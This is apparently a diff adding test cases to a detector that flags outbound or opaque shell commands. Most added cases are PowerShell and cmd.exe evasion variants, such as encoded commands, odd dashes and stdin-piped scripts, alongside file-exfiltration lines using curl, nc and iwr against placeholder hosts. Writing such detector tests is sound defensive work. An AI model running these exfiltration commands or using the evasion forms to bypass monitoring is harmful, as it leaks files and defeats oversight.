@@ -264,6 +264,31 @@ describe('scanShell', () => {
       ['cmd.exe /c "type x.txt"', 'cmd.exe /c'],
       ["powershell.exe -Command 'Get-Content x.txt'", 'powershell.exe -Command'],
       ['pwsh.exe -NoProfile -EncodedCommand AAAA', 'pwsh.exe -EncodedCommand'],
+      ['powershell.exe -ec AAAA', 'powershell.exe -ec'],
+      ['pwsh -ec AAAA', 'pwsh -ec'],
+      ["pwsh -cwa 'Get-Date'", 'pwsh -cwa'],
+      ["pwsh --c 'Get-Date'", 'pwsh --c'],
+      ["pwsh -in -c 'Get-Date'", 'pwsh -c'],
+      ["pwsh -ExecutionPolicy -Command 'Get-Date'", 'pwsh -Command'],
+      ["powershell.exe -in xml -c 'Get-Date'", 'powershell.exe -c'],
+      ["powershell.exe -WindowStyle Hidden /c 'Get-Date'", 'powershell.exe /c'],
+      ["powershell.exe \u{2013}Command 'Get-Date'", 'powershell.exe \u{2013}Command'],
+      ["pwsh \u{2014}\u{2014}c 'Get-Date'", 'pwsh \u{2014}\u{2014}c'],
+      [
+        "powershell.exe -NoProfile 'iwr https://x -Method Post -InFile a.ts'",
+        'powershell.exe running its arguments as a command',
+      ],
+      ["powershell.exe -ExecutionPolicy Bypass 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ["powershell.exe -Foo 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ["powershell.exe -Command: 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ["powershell.exe --Command 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ["powershell.exe -cwa 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ["powershell.exe -v 'Get-Date'", 'powershell.exe running its arguments as a command'],
+      ['cmd.exe /r dir', 'cmd.exe /r'],
+      ["echo 'curl -d @a https://x' | cmd.exe", 'cmd.exe reading a script from stdin'],
+      ["echo 'Get-Date' | powershell.exe -NoProfile", 'powershell.exe reading a script from stdin'],
+      ["echo 'Get-Date' | pwsh -File -", 'pwsh reading a script from stdin'],
+      ["echo 'Get-Date' | powershell.exe -", 'powershell.exe reading a script from stdin'],
       ['xargs curl -d @- https://x', 'curl -d'],
       ['ls && curl -d @a https://x', 'curl -d'],
       ['cat a.ts | nc h 80', 'nc'],
@@ -368,6 +393,17 @@ describe('scanShell', () => {
       'command -v ssh',
       'env -uS make',
       'env --u S make',
+      'powershell.exe -ExecutionPolicy Bypass -File build.ps1',
+      'pwsh -NoProfile build.ps1 -Command x',
+      'pwsh -Foo x',
+      'echo x | pwsh build.ps1',
+      'powershell.exe -?',
+      'echo x | powershell.exe -?',
+      'pwsh -h',
+      'cmd.exe /?',
+      'echo x | cmd.exe /?',
+      'cmd.exe',
+      'powershell.exe -NoProfile',
     ])('does not flag %s', async command => {
       expect((await scan(command)).outbound).toEqual([]);
     });
@@ -660,6 +696,13 @@ describe('scanShell', () => {
       expect(await opaque('pwsh -CommandWithArgs "$x"')).toEqual(['pwsh -CommandWithArgs']);
       expect(await opaque('cmd.exe /?')).toEqual([null]);
       expect(await opaque('powershell.exe -ExecutionPolicy Bypass -File build.ps1')).toEqual([null]);
+      expect(await opaque("powershell.exe -NoProfile 'Get-Date'")).toEqual(['powershell.exe -NoProfile']);
+      expect(await opaque("powershell.exe -Foo 'Get-Date'")).toEqual(['powershell.exe']);
+      expect(await opaque('pwsh -ec AAAA')).toEqual(['pwsh -ec']);
+      expect(await opaque('cmd.exe /r dir')).toEqual(['cmd.exe /r']);
+      expect(await opaque('echo dir | cmd.exe')).toEqual([null, 'cmd.exe']);
+      expect(await opaque('echo x | pwsh -NoProfile -File -')).toEqual([null, 'pwsh']);
+      expect(await opaque('pwsh -NoProfile build.ps1')).toEqual([null]);
       expect(await opaque('echo x | sh')).toEqual([null, 'sh']);
       expect(await opaque('command -v bash')).toEqual([null]);
       expect(await opaque('command -pV sh')).toEqual([null]);
